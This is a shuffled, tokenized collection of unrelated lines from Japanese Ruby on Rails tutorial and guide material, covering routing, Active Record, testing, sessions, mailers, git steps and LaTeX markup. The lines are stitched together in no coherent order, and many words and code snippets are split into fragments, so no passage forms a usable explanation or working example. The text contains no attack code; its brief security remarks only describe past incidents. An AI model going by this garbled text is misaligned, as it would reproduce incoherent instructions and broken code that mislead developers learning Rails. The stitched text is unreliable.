▁最初に ` data - * ` 属性を リンク に追加し ておきます ▟ 続いて 、 この 属性 を持つ すべての リンク で 発生 する クリック イベント に ハンドラ を バ イン ド します 。
▁\ k ode { email } 属性 の 存在性 を検証する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 } { /5}{/ 4 } { 4 } {/4} {/3}
▁Git を使っている 方は 、 この時点で master ブランチ に 変更を マージ してください 。
▁ アップグレード 時に はこの 記 述 を Gemfile から 削除 する必要があります 。
▁ 読者 が 話 す 言語 に応じて 異なる ニ ュ ー ス レ ター を送信し たい とします 。
▁特定の属性にアクセスするための 、 テキスト エリア 用 開 始 タグ と 終 了 タグを返します 。
▁ 表示 したい 文字列 を返す アクション を定義し たので 、 今度は デフォルトの ページ ▁( 図 \ ref { fig : riding _ rails _ environment }) ▁ の代わりに この アクション を使用する よう Rails に 指示 します 。
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 000 000 02 9 a 08 38 >
▁User モデル 内の コードは 、\ k ode { before \_ create } コールバック ▁( リスト \ ref { code : user _ model _ activation _ code }) ▁ 内で 使用される \ k ode { create \_ activation \_ digest } メソッド と似ています ( リスト \ ref { code : user _ model _ password _ reset }) 。
▁ ログインフォーム のモックアップ
▁* ▁` photos _ path ` は ` / photos ` を返します
▁# ▁app / mailers / application _ mailer ▖ rb
▁ プロフィール画面 ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) ▁ に ▁[ Follow ] ▁ボタンが表示されている
▁もし \ k ode { full \_ title } ヘルパー を使って 他の テスト も リファクタリング した く なったら ▁( 例えば リスト \ ref { code : base _ title _ test } など ) 、\ k ode { test \_ helper ▖ rb } から Application ヘルパー を インクルード してください 。
▁ 先ほど の 順 で 書いた 統合テスト は 、 リスト \ ref { code : microposts _ interface _ test } のようになります 。
▁` has _ one ` 関連付けを 宣言 した クラス では 、 以下の 5 つの メソッドを 自動的に 利用 できるようになります 。
▁ユーザー登録 失敗 ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ failure _ rails _ 4 - full ▖ png }{( フル サイズ )}
▁Active ▁Record には 、 クラス 定義 の 内 側 で 直接 使用できる 定義 済み のバリデーション ヘルパー が 多数 用意されています 。
▁Ruby ▁on ▁Rails で 欲 しい 機能 がある なら 、 自分で コード を書いて ください ▟ あるいは 、 誰 か に お 願 い して コード を書いて も ら ってください 。
▁root ▁' pages # main ' ▁# ▁上の 省略 形
▁Rails の コーディング を行う 場合は 、 以下の シンプルな スタイル ガイド に従い ます 。
▁class ▁R o le ▁< ▁ActiveRecord :: Base
▁ 関連付けの コールバック も 、 上のような 通常の コールバック と だいたい 同じです が 、( Active ▁Record オブジェクト ではなく ) コレクション のライフサイクル によって イベント が トリガ される 点 が異なります 。
▁ このような 場合には `: body ` オプション を使用できます 。
▁\ k ode { self } を使って トークン や ダイジェスト の 新しい メソッド を定義する
▁\ k ode { join } メソッドは これ と 逆 の動作 です 。
▁ フラッシュメッセージ の 残 留 問題 はこの アプリケーションの バグ です ▟ この問題 を修正する 前に 、 この問題 を キャッチ する テストを書く のが 正しい や り 方 です 。
▁` ActiveSupport :: Callbacks ` が 書き 直 され 、 上のような 動作 は Rails ▁4▖1 では 許 容 され なくなりました 。
▁ リソース フル ルーティング を カスタマイズ する
▁{0} 図 10 ▖ 14 {/0} {1} ▁( プロ ト ) ▁ フィード のある ホームページ ( \ href { http :// localhost :3000/}{/}) ▟\ href { http :// railstutorial ▖ org / images / figures / home _ with _ proto _ feed - full ▖ png }{( 拡大 ) }{/1}
▁\ ref { sec : user _ validations } で 詳 細 について解説します が 、 今は まず 先ほど の \ k ode { user } オブジェクトが 有効 かどうか 確認し てみましょう ▟ 確 認 するためには \ k ode { valid ?} メソッド を使います 。
▁ キャッシュストア の設定 は ` config ▖ assets ▖ cache _ store ` で 変更 できます 。
▁ スコープ では 、` where `、` joins `、` includes ` など 、 これまで に 登 場 した すべての メソッド を使用できます 。
▁そこで 、 Ruby の慣習 に従って 、\ k ode { User ▖ find \_ by } の実行 結果を インスタンス変数 に保存 する ことにします ▟ こうすることで 、 データベースの 読み出し は 最初の 一 回 だけ になり 、 以後 の 呼び出し では インスタンス変数 を返す ようになります { p 1 } ▟ 地 味 な よう ですが 、 Rails の 高速 化 のために 重要な テクニック です 。
▁これは Rails が 、\ k ode { redirect \_ to ▁@ user } という コード から \ k ode { user \_ url (@ user )} といった コードを 実行 したい ことを ( 自動的に ) 推 察 してくれ た 結果 になります 。
▁create ▁app / views / welcome / index ▖ html ▖ erb
▁( 他の 3 つの リンク には オプション ハッシュ が指定されてい ません が 、 必 須 では ないので 構 いません ) 。
▁ 念のため 、 最初に 作成 時の 状態 に対して も テスト を書いて お き 、 最初の モデル が 有効 である かどうか も 確認し ておきます 。
▁ マイグレーション 自体 は 、 データベース に与える 変更を 定義 した \ k ode { change } メソッドの 集 まり です 。
▁ あなた が コミット した コード に対して 変更を 求 め られる ことがあります 。
▁password :
▁\ k ode { print } メソッド も 同様 の 出力 を行います が 、 以下のように 、 改行 文字 を追加し ない 点 が異なります 。
▁ 幸 い 、 それらの ほとんど が 現在 でも 入 手 / アクセス可能 です 。
▁Contact
▁ サインイン 後 にリダイレクトされる のは ユーザーの プロファイル ページ ですが 、 この場合は も とも と ▁" Edit ▁user " ▁ ページ にアクセス し よう として いた のです から 、 その ページに リダイレクト する ようにします 。
▁#### ▁` audio _ tag ` を使用して 音 声 ファイル にリンクする
▁ これが 、 いわゆる 「 リクエスト - レスポンス 」 の サイクル です 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ orders _ count ▁ IN ▁( 1, 3 , 5 ) )
▁ ╼ publish , ▁distribute , ▁sub license , ▁and / or ▁ se ll ▁copie s ▁of ▁the ▁ Software ,
▁ このような 処理 をそのまま 実装 すると 以下のように なる でしょう 。
▁` match es ?` メソッド および ラ ム ダ は いずれも 引数として ` request ` オブジェクトを 取り ます 。
▁ 完全な テスト 機能 を備えた 強力な Web フレームワーク が なかった 頃 は 、 開発者 は フォームの テストを 毎 回 手動で 行う 必要 があり ました 。
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁add ▁- A ╼ $ ▁git ▁commit ▁- m ▁" F in is h ▁log ▁in / log ▁out " ╼ $ ▁git ▁ checkout ▁master ╼ $ ▁git ▁merge ▁log - in - log - out
▁ この節 の 作業 は かなり 厄 介 です ▟ また 、 bundle ▁exec の 入力 を省略 する方法 を 2 とおり の 方法 で説明します 。
▁ これはリスト \ ref { code : user _ spec } で使用されていました 。
▁ い つ も と同様 、 これらの テストを 以下のように \ k ode { rspec } コマンドで 実行 できます 。
▁ dup ▁= ▁hash ▖ deep _ dup
▁ これはリスト \ ref { code : test _ close _ browser } で使用されていました 。
▁* ▁` config ▖ active _ record ▖ partial _ write s ` は 、 部分 書き込み を行なう かどうか ( 「 d ir t y 」 と マーク された 属性 だけ を更新する か ) を指定する 論理値 です 。
▁let (: f ound _ user ) ▁ { ▁User ▖ find _ by ( email : ▁@ user ▖ email ) ▁ }
▁ 細 か い ことを 言 えば 、\ ref { sec : updating _ users } の アカウント 設定 更新 機能 を使って 、 お か し な メールアドレス を設定する ことも できてしまいます ▟ ここで 行う 実装 では 、 メール による メールアドレス 検証 のメリット を ▁( や り す ぎ ない 範囲 で ) ▁ 十分 享 受 できる はずです 。
▁#### ▁` url _ for ` を使用して URL を生成する
▁ アカウント有効化 用の 属性 と インデックス を追加する マイグレーション
▁HTML 構造 を削除し た Help ページ
▁この章では 、 他のユーザーをフォロー ▁( および フォロー解除 ) ▁ できる ソーシャル レ イ ヤ ー を追加し 、 各 ユーザーの Home ページに 、 現在 フォロー 中の ユーザーの ステータスフィード を表示できるように して 、 サンプルアプリケーションの コア を 完成させます 。
▁Rails 全 般 に対する 設定 を行う には 、` Rails :: Railtie ` オブジェクト を呼び出す か 、` Rails :: Engine ` や ` Rails :: Application ` の サブクラス を呼び出します 。
▁ここで 、 以下のコード を見てみましょう 。
▁6 ▁examples , ▁0 ▁failure s
▁ アプリケーションの 寿 命 を 永 ら え 、 保 守 作業を 苦 痛 な もの に しないよう に するためには 、 コントローラ のコード 量 は 可能な 限り 減 ら すべき です 。
▁ 一 点 、 リスト { p 0} で 注意 すべき 箇所 は 、 次のように 参 照 先 ▁( {2} followers {/2} ) ▁ を指定する ための {2} : source {/2} キー を省略 しても よ か った という 点 です 。
▁ Factory ▁Girl は 、 RSpec を使用して Ruby で 「 ドメイン 特 化 言語 ▁( domain - specific ▁language )」 を定義します ▟ ここでは 、 Active ▁Record の オブジェクトの 定義 に 特 化 しています 。
▁get ▁' こんにちは ', ▁to : ▁' welcome # index '
▁ そこに 見つからない 場合は 、 続いて エンジンの 中 を 探 索 します 。
▁ 本ガイド はこの 特殊な 月 について 長 々 と 解説 することは しません が 、 メソッドが この 月 でも 期待どおり に 動作 すること については 説明 しておきたい と思います 。
▁Rails ルート で使用する Users リソース 用の ルール
▁### ▁B en ch m ar k Helper
▁ これを 解 消 するには 、 次のように します 。
▁ ところで 、 リスト \ ref { code : persistent _ sessions _ test } では 以下のように 書 いて も よい ように 思える かもしれません 。
▁Rails ▁3▖2 から Rails ▁4▖0 へのアップグレード
▁{0} 図 11 ▖ 18 {/0} {1} ステータスフィード が表示され た Home ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Application コントローラに Session ヘルパー モジュール を インクルード する
▁今度は 、 この フォーム を 出力 ▁( レンダリング ) ▁ するために Password Re set s コントローラの \ k ode { edit } アクション 内で \ k ode {@ user } インスタンス変数 を定義する 必要があります 。
▁ RAILS _ ROOT / config / routes ▖ rb ▁# ▁N O
▁ 最も 多 い 攻 撃 は 、 iframe を使用して 外部 の コードを Web ページ に含め る 方法 です 。
▁ ユーザー一覧ページ に 1 00 人 の サンプルユーザー が表示されている
▁ 既存の レコード を更新する と 、 SQL の ` UPDATE ` 操作 が 送信されます 。
▁ この節 の冒頭 で 簡単に 紹 介 した ように 、 この 目的 に 使用できる 専 用の テスト データベース \ k ode { db / test ▖ sqlite 3 } があります 。
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ s li ce (: a , ▁: c )
▁**` Rack :: Runtime ` **
▁# ▁do ▁process ▁ video
▁上 も 自体 も ハッシュ であり 、 以下の 要素を 含 んで います 。
▁図 \ ref { fig : edit _ page } の HTML ソース を見 てみると 、 少しだけ 違 う 箇所 もあります が 、 お お よ そ form タグ は 期待どおり に 表示 されています ▁( リスト \ ref { code : edit _ form _ html })▟ 。
▁ これはリスト \ ref { code : gemfile _ rspec } で使用されていました 。
▁ アプリケーションの 開発 が 進 む と 、 コードの どこか ら とも なく 「 腐 敗 臭 」 が 漂 い 始 め ます ▟ コード や 記 法 の 統 一 が 崩 れ て 読み づ ら くなる 、 クラス や メソッドが 何 百 行 にも 膨 れ 上 が って 読む 気 を 削 が れる 、 な ぜ このコード が ここに ある のか 最 早 誰 も その 理由 を 思い 出 せ な くなる 、 同じ コードが あ ち こ ち に コ ピ ペ されて 少し ずつ 書き 換 えられ 手 に 負 え な くなる 、 など です 。
▁ 経験 から 申し上げ ると 、 どう しても 必要な 場合 を除いて 、 ドキュメント で シ ング ル ト ン を使用 すべき ではありません 。
▁# ▁ 定数 M が 再度 存 在 し 、 モジュール オブジェクト " M " を保持し ている が
▁作成した コードをリスト \ ref { code : password _ reset _ test } に示します
▁ Initial ▁commit
▁TIP : ▁ エンジン によって は 、 この ファイルを エンジンの ための グローバル 設定 オプション として 配置 したい ことも ある でしょう 。
▁FROM ▁" orders "
▁ 特定の バージョンの Rails インストーラ へのリンク を作成して も ら え る よう 、 現在 Engine ▁ Y ar d に 働 き かけ ています 。
▁ ミックスイン は \ ref { sec : using _ form _ for } でも 使用します 。
▁validates ▁: name , ▁length : ▁ { ▁ minimum : ▁2 ▁ }
▁ データベースに サンプルユーザー を追加する Rake タスク 。
▁ 実際 は 、 Heroku で生成された デフォルトの アドレス でも 十分です 。
▁ モデル を作成するとき は 、 上 と 似 た ような パターン で \ k ode { generate ▁model } という コマンド を使います ▟ さらに 、 今回は \ k ode { name } や \ k ode { email } といった 属性 を付け た User モデル を使い たい ので 、 実際に 打 つ コマンドは リスト \ ref { code : generate _ user _ model } になります 。
▁### ▁ コメント への ルーティング を追加する
▁上 記 のコード で 重要なのは 、 以下の行 です 。
▁{0} 図 3 ▖9{/0} ▁{1} ファイル ナ ビ ゲ ー ター にある ▁( あまり 目 立 た ない ) ▁ ギ ア の アイコン {/1}
▁* ▁ Asset ▁Pipeline の : cache オプション と : concat は 廃 止 されました ▟ ビュー から これらの オプションを 削除 してください 。
▁従って 、 上 の例では ` / photos /1 ` のような パス には マッチ し なくなります 。
▁> > ▁Rails ▖ env ▖ production ?
▁このとき アクション で 使用できる ` params ` は ▁` { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' , ▁user _ id : ▁' 2 ' ▁}` となります 。
▁これらの 変更 を加える ことで Home ページの テストは より 簡潔 になります 。
▁ ╼ ▁* = ▁require _ self
▁`@ article ▖ comments ` に対して ` create ` メソッド を実行する ことで 、 コメント の作成 と 保存 を 同時に 行 っています ( 訳 注 : ▁` build ` メソッドに すれば 作成 のみ で 保存 は 行 いません ) 。
▁#### ▁` to _ options ` と ` to _ options !
▁ これはリスト \ ref { code : gem r c } で使用されていました 。
▁Rails は 以下のような ヘルパー も 追加 しています 。
▁ これを行うには 、 Rails で \ k ode { form \_ for } ヘルパーメソッド を使用します ▟ このメソッドは Active ▁Record オブジェクトを 取り 込 み 、 オブジェクトの 属性 を使用して フォーム を 構成 します 。
▁これらの コード により 、 上 から 2 番目の マイクロポスト を削除する と 、 図 ▁\ ref { fig : home _ post _ delete } のように うまく 動く はずです 。
▁` logout _ path ` を呼び出す と ` / ex it ` が返されます 。
▁# ▁=> ▁nil
▁xml ▖ a (" A ▁Link ", ▁" href " ▁=> ▁" http :// rubyonrails ▖ org ")
▁@ comment ▁= ▁@ article ▖ comments ▖ create ( comment _ params )
▁* ▁` auto b uffer : ▁true ` は 、 ページ 読み込み 時に すぐ 再 生 できるように 音 声 ファイル を事前に 読み 込 んで お きます 。
▁ このような 些 細 な 例 の場合は それ ほど 問題 になり ません が 、 以下のように エスケープ の 必要な 文字 が 大 量 にある 場合には 、 シングルクォート は非常に 便利です 。
▁また 、\ k ode { has \_ secure \_ password } を使って パスワードを ハッシュ化 するためには 、 最 先 端 の ハッシュ 関数 である \ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } が必要 になります 。
▁ 新しい バージョンの Rails では 、 同じ ことを ` t ▖ references ▁: supplier ` という 方法で 記 述 できます ▟ こちら の方が 実装 の詳細 が 抽 象 化 され 、 隠 蔽 されます 。
▁ 本 節 では 、 セッション の 永 続 化 の 第 一 歩 として \ emph { 記憶トークン ▁( remember ▁token ) ▁ } を生成し 、\ k ode { cookies } メソッド による 永続的 cookies の作成 や 、 安全 性 の高い \ emph { 記憶ダイジェスト ▁( remember ▁digest ) ▁ } による トークン 認 証 に この 記憶トークン を 活用 します 。
▁"#{ first _ name ▖ first } ▖ ▁# { last _ name } "
▁ 今 なら 、 このコード を 理解 できる ようになった はずです 。
▁これで Microposts を作成する 準備ができました ▟ 作成 方法は \ ref { sec : a _ user _ tour } と同じ です 。
▁\ ref { sec : the _ hello _ application } ▁ の ▁\ k ode { rails ▁new } コマンド と \ ref { sec : bundler }, の \ k ode { bundle ▁install } コマンドを実行 した ことにより 、 実際に 動 か す こと の できる アプリケーション が作成され ました 。
▁ エンジンの コントローラ から メ イン アプリケーションの ` Application Controller ` へのアクセス を提供 するには 、 エンジン が 所有 する スコープ 付き の ` Application Controller ` に 変更 を加え 、 メ イン アプリケーションの ` Application Controller ` を 継 承 する のが 簡単な 方法 です 。
▁図 \ ref { fig : word _ inheritance _ ruby _ 1 _ 9 } に この クラス 階層 を示します 。
▁これにより 、 新しい バージョン での ファイル 作成 や 既 存 ファイルの 変更を 対 話 形式で 行なうことができます 。
▁# ▁For ce ▁all ▁access ▁to ▁the ▁app ▁over ▁SSL , ▁use ▁ Strict - Transport - Security ,
▁さらに 、\ k ode { pluralize } という 英語 専 用の テキスト ヘルパー が 新たに 登 場 しています 。
▁\ k ode { f ▖ object } は \ k ode {@ user } となり 、 以下のコード の場合は
▁ 記憶トークン には ランダム な 文字列 を生成し て 用 い る 。
▁Rails で 事前 定義 済み の \ k ode { session } メソッドを使用して 、 単純な ログイン を 行えるように します
▁# ▁config ▖ mock _ with ▁: f le x mock
▁------------ ----------------
▁上のコードは 以下のように 1 行 で 書 け ます 。
▁has _ many ▁: orders , ▁-> ▁ { ▁where ▁processed : ▁true ▁ }
▁module ▁ActiveRecord
▁xml ▖ title (@ feed _ title )
▁class ▁Person ▁< ▁ActiveRecord :: Base
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 2 ▁tests , ▁2 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁### ▁` acceptance `
▁まずは 、 新規 ユーザー登録 用の 統合テスト を生成する ところから始め ていきます ▟ コントローラ ー の慣習 である 「 リソース 名 は 複数形 」 に 因 んで 、 統合テスト の ファイル名 は \ k ode { users \_ signup } とします 。
▁たとえば 、 アプリケーションに 完成 品 ( assembly ) と 部品 ( part ) があり 、1 つの 完成 品 に 多数の 部品 が 対応 し 、 逆に 1 つの 部品 にも 多くの 完成 品 が 対応する のであれば 、 モデルの 宣言 は以下のようになります 。
▁ このため 、` explain ` はこの クエリ を 実際に 実行 し 、 それ から クエリ プ ラン を要求します 。
▁ 必要となる \ k ode {@ user } 変数 の定義 は 、 以下の リスト \ ref { code : new _ action _ with _ user } のようになります 。
▁ 先ほど 説明 した 埋め込み Ruby を レイアウト に 埋 め 込 んだ 結果を 、 リスト \ ref { code : layout _ flash } に示します 。
▁\ href { http :// www ▖ code school ▖ com /}{ Code ▁School } : ▁ プログラミング を対話的に 学習 できる コース
▁=> ▁Application Controller
▁Rails :: Server ▖ new ▖ t a p ▁do ▁| server |
▁xml ▖ title ( item _ title ( item ) )
▁ 例
▁ ここ から わかるように 、 たとえば 上の 例 での contributors の リスト の ルート 要素 は 、 コレクション が もし 空 であれば ▁" contributors " ▁ ではなく ▁" nil クラス " ▁ になっ てしまう ということです 。
▁上 を リソースフルな ルーティング で 記 述 すると 以下の ようになります 。
▁この 状態 で 実際に 新規ユーザー として 登録 してみる と 、 リダイレクト されて 図 \ ref { fig : redirected _ not _ activated } の ようになり 、 リスト \ ref { code : account _ activation _ email } のような メール が生成されます 。
▁上の 宣言 のまま では 、 `@ customer ▖ orders ▖ size ` の値 を知る ために データベース に対して ` C O U N T (* ) ` クエリ を実行する 必要があります 。
▁これにより 、 この 変数 は すべての \ text tt { before } または \ text tt { it } ブロック で テストの 間 利用 できるようになります 。
▁default _ scope ▁ { ▁where (" remove d _ at ▁ IS ▁NULL ") ▁ }
▁X ▁# ▁=> ▁: in _ M
▁ 後者の マイグレーション ファイルは 、 データベース 構造 を作成するための もの であり 、 この 次に 説明します 。
▁リスト \ ref { code : hello _ action } の \ k ode { hello } アクション を書き換え 、「 Hello , ▁world !」 の代わりに 「 hola , ▁ mundo !」 と 表示される ように してみましょう 。
▁ 本番 アプリケーション や テストで 挿入され る ことはありません 。
▁ 現在の パスワード 関連 テスト がすべて パス する ようになり 、 他の 多くの テスト にも パス するようになります 。
▁class : ▁" nav _ bar " ▁%>
▁ 結果 として 、 開発環境 と 本番環境 という 、2 つの 異 な った 状 況 に対して それぞれ 最 高 の 環境 を提供 してくれます 。
▁# ▁" M " という名前の モジュール を再度 定義 する
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 3 , ▁ separator : ▁' ! ')
▁Active ▁Support は ` NameError ` に ` missing _ name ?` メソッド を追加します ▟ このメソッドは 、 引数として 渡された 名前 が原因で 例外 が発生する かどうか をテストします 。
▁ 2006 年 12 月 、 実 在 する 34 , 000 人のユーザー 名 と パスワードが [ MySpace への フ ィ ッ シ ング 攻 撃 ]( http :// new s ▖ net craft ▖ com / archive s / 2006 / 10 / 27 / my space _ account s _ com p r o mis ed _ by _ ph is her s ▖ html ) によって 盗 み 出 されました 。
▁` assert _ generate s ` は 、 特定の オプション の 組み合わせ を使用した 場合に 特定の パス が生成され ること 、 そして それら が デフォルトの ルーティング でも カスタム ルーティング でも 使用できる こと をテストする アサーション ▁( assert , ▁ assert ion : ▁ 主 張 ・ 検証 とも ) ▁ です 。
▁作成した コードをリスト \ ref { code : db _ seed } に示します
▁ セキュア な パスワード の実装 は 、\ k ode { has \_ secure \_ password } という Rails の メソッドを呼び出す だけで ほとんど 終 わ ってしまいます ▟ このメソッドは 、 User モデル で 次のように 呼 び 出 せ ます 。
▁ 私 は 多くの ▁Rails ▁ 関連の 本 を参考に して きました が 、 真 の 決定 版 と 呼 べ る もの は 本書 を お いて 他 に ありません 。
▁ umerate }╼╼ ▁% ▁subsection ▁find ing _ and _ authenticating _ a _ user ▁( end )╼╼ ▁\ subsection { フラッシュメッセージ を表示する } ▁% ▁( fold )╼ ▁\ label { sec : render ing _ with _ a _ flash _ message }╼╼
▁最後に 、` edit ` アクション へのリンク を 全 記事 の 一覧 に追加し ましょう ▟ ` app / views / articles / index ▖ html ▖ erb ` に 以下のように 手 を 加えて " Show " リンク の 隣 に Edit リンク を追加します 。
▁#### ▁hidden _ field _ tag
▁ セキュリティ 、 それ も Web アプリケーションの セキュリティ は非常に 幅 広 く 、 かつ 詳 細 に 渡 っています 。
▁今度は 、\ emph { リポジトリ } ▁(\ emph { repo } と 略 される こともあります ) ▁ ごとに 作成 の 必要な 作業 を行います 。
▁### ▁ ジェネレータ の設定
▁* ▁" THE ▁B E ER - W A RE ▁L I C E N SE " ▁( R evi s ion ▁42 ) :
▁ 具体的には 、 ユーザーのマイクロポスト を 特定の \ emph { 順序 } で 取得 できるように したり 、 マイクロポストを ユーザーに \ emph { 依 存 させ て } 、 ユーザーが 削除され たら マイクロポスト も 自動的に 削除され るように していきます 。
▁` pluralize ` は 、 数値 を受け 取 って それ に応じて 英語 の 「 単数形 / 複数形 」 活用 を行って く れる Rails の ヘルパーメソッド です 。
▁Active ▁Record は 条件 を ハッシュ で 渡す こともできます ▟ この 書 式 を使用することで 条件 構 文 が 読みやすく なります 。
▁use ▁ActiveRecord :: Connection Adapters :: Connection Management
▁* ▁` config ▖ action _ mailer ▖ smtp _ settings ` は 、`: smtp ` 配信 方法を 詳 細 に設定する の に 使用できます 。
▁このコードは リスト \ ref { code : hello _ action } で使用されていました ▟ もうひとつ 、
▁ 他の エンコード を使用したい場合 、 事前 に 好 み の エンコード を 適用 した コンテンツ を ` Hash ` で エンコード してから ` attachments ` に 渡します 。
▁< option ▁value =" "></ option >
▁Capybara ▁ DSL を RSpec ヘルパー ファイル に追加する 。
▁ここで 必要な のは 、` app / models / article ▖ rb ` と ` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles ▖ rb ` の 2 つだけ です ▁( 後者の ファイル名 には 日付 が含まれている ので これ と同じ に はなりません ) 。
▁<%= ▁render ▁@ users ▁%>
▁ 今後 登 場 する スタイル 要素を 利用 できるように するために 、\ k ode { home ▖ html ▖ erb } ビュー に 特別な 要素 をいくつか 追加します ( リスト \ ref { code : signup _ button }) 。
▁### ▁ プルリクエスト を 発行する
▁ クラウド ワークスペース 上で 実行 している ローカル サーバー を 共有 する 。
▁ Uni code 文字列を ルーティング で 直接 使用 することもできます 。
▁\ chapter { レイアウト を作成する } ▁% ▁( fold )╼\ label { cha : filling _ in _ the _ layout }╼╼ In ▁the ▁process ▁of ▁tak ing ▁a ▁brief ▁to ur ▁of ▁Ruby ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁we ▁ learned ▁about ▁including ▁the ▁application ▁stylesheet ▁into ▁the ▁sample ▁application ▁( Section ~\ ref { sec : motivation }), ▁but ▁( as ▁noted ▁in ▁Section ~\ ref { sec : css _ revisited }) ▁the ▁stylesheet ▁doesn ' t ▁yet ▁contain ▁any ▁CSS \ @ ▖ ▁In ▁this ▁chapter , ▁we ' ll ▁start ▁ filling ▁in ▁the ▁custom ▁stylesheet ▁by ▁in c or p or ating ▁a ▁CSS ▁framework ▁into ▁our ▁application , ▁and ▁then ▁we ' ll ▁add ▁some ▁custom ▁style s ▁of ▁our ▁own ▖ \ foot note {
▁ いつものように \ k ode { bundle ▁install } を実行して 、 Bootstrap をインストール します 。
▁ パスワード再設定の データモデル も 、 アカウント有効化 の場合 と似ています ▁( 図 \ ref { fig : user _ model _ account _ activation }) 。
▁Rails は アプリケーションの ▁( ` test / dummy ` ) ▁` app / views ` を 最初に 検索 し 、 続いて エンジンの ` app / views ` ディレクトリ を検索し ます 。
▁{" development "=>{" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database ", ▁" po ol " => 5}}
▁WARNING : ▁` M ul t i J s on ▖ dump ` ▁ と ▁` M ul t i J s on ▖ load ` をそれぞれ ` JSON ▖ dump ` と ` JSON ▖ load ` に 単 純 に置き換え て は 「 い け ません 」 。
▁Guard は ファイルシステム の 変更を 監 視 し 、 たとえば \ k ode { static _ pages _ spec ▖ rb } ファイル を変更する と 自動的に テスト を実行します 。
▁ただし このメソッド では 、 仕 様 上 一部の HTML タグ ( & lt ; a & gt ; など ) が 除 去 されません 。
▁ Cloud ▁IDE を使っている と 、( 筆者 にも 理由は 分 から ない のですが ) ▁ とき ど き 2 行目 の mv コマンドで 失敗 すること がある よう です ▟ その 場合は 、1 行目 の \ k ode { curl } コマンドを もう一度 実行 して 、 ロゴ 画像 が正しく ダウンロード でき ている かどうか 確認してください
▁OS の違い 、 バージョンの 違い 、 テキストエディタ の設定 の違い 、 IDE の違い など 、 環境 に ば ら つ き があると 、 さまざまな 問題 が 複 合 して 発生 してしまいます 。
▁@ new _ assemblies ▁= ▁@ part ▖ assemblies ▖ where (" created _ at ▁> ▁? ", ▁2▖ day s ▖ ago )
▁\ k ode { render ▁@ users } を実行すると 、 自動的に \ k ode { _ user ▖ html ▖ erb } パーシャル を参照 し 、 各 ユーザーを コレクション として 表示する
▁` render ▁: action ` は 対象 となる アクション のコード を実行し ない ことを思い出してください ▟ 従って 、` index ` ビューで おそらく 必要となる `@ books ` インスタンス変数 には 何も 設定 され ず 、 空の 蔵 書 リスト が表示され てしまいます 。
▁ マイクロポスト 用の fixture
▁この アプリケーションコード では before _ filter を使用しています が 、 ここでは \ k ode { destroy } アクション から 管理者 へのアクセス を 制限 するのに 使用している ことに 気 付 いた 方 も い る かもしれません 。
▁ オブジェクト リ レ ー シ ョ ナ ル マッピング ▁( O / R マッピング や ORM と 略 される こともあります ) とは 、 アプリケーションが 持つ リ ッ チ な オブジェクトを リ レ ー シ ョ ナ ル データベース ( R D B M S ) の テーブルに 接続 する ものです 。
▁x ▁= ▁x ▁+ ▁1
▁1234567890 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 15 ▁G B
▁以上で テストスイート は ▁\ passing ▁ になるはずです 。
▁ 特に 、2 つの 開発 手法 を 比 較 するために 、 RSpec による 結合テスト の 組み合わせ を Cucumber で 再 実装します 。
▁最後に 、\ emph { あえて } 最終的に サードパーティ の 認証システム を導入する こと になった としても 、 自分自身 で 認証システムを 構 築 した 経験 があれば 、 サードパーティ 製 品 を 理解 して 変更 すること が ずっと 容易に なる はずです 。
▁ アセット ディレクトリ
▁* ▁` active _ record ▖ set _ config s `: ▁` config ▖ active _ record ` の設定 を使用して Active ▁Record を設定します ▟ 使用される ` config ▖ active _ record ` の設定 は 、 メソッド名 が ` ActiveRecord :: Base ` に対する セッター として ` send ` され 、 それ を経由して 値が 渡される ことによって 行われます 。
▁デフォルトでは ` app / assets ` の 検索 が 優 先 される ので 、 対応する パス が ` lib ` や ` vendor ` にある 場合は マ ス ク されます 。
▁# ▁</ hash >
▁ 意味 のある サンプル コードを 選 ぶ こと ▟ 概 要 と 基本 を 端 的に 示 し 、 かつ 興 味 深 い 点 や 落とし 穴 も 示 されている のが 理想 です 。
▁id を 指定 せずに すべての メンバー を表示する には 、 以下のように \ k ode { collection } メソッドを使用します 。
▁self を省略した 結果を リスト \ ref { code : user _ index _ tests } に示します 。
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ でした が ▁( 図 \ ref { fig : home _ with _ proto _ feed _ 3 r d _ edition }) 、 リスト \ ref { code : from _ users _ followed _ by _ final } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed }) 。
▁それでは 、 楽 し んで お 読み ください !
▁これ を行う ために 、 リスト { p 0} の {2} hidden _ field _ tag {/2} メソッドを使用します ▟ このメソッドは ▁以下の フォームの HTML を生成します 。
▁{0} 表 12 ▖2{/0} ▁{1} カスタム ルール で 提供する リスト \ ref { code : following _ followers _ action s _ routes } の RESTful ルート {/1}
▁* ▁`: status `
▁Rails が invalid ▁ mass ▁assignment エラーを 発生 するよう にする 設定 。
▁ 記憶トークン や それ と 対応する 記憶ダイジェスト を ユーザー ごとに 関連付け て 、 永続的セッション で 使用できます 。
▁# ▁ rspec - rails ▖
▁次の 第 \ ref { cha : rails _ flavored _ ruby } 章では 少し 回 り 道 を し 、 Rails を 支 え ている Ruby という 言語 について 簡単に 学びます 。
▁( CSS ファイル名 の 後に 、\ k ode { ? body = 1 } のような 行 が 余 分 に表示されている ことがあります 。
▁この場合 、 以下の メソッド呼び出し の結果 をテストする ことができます 。
▁これで 4 つ が 順に 実行されます 。
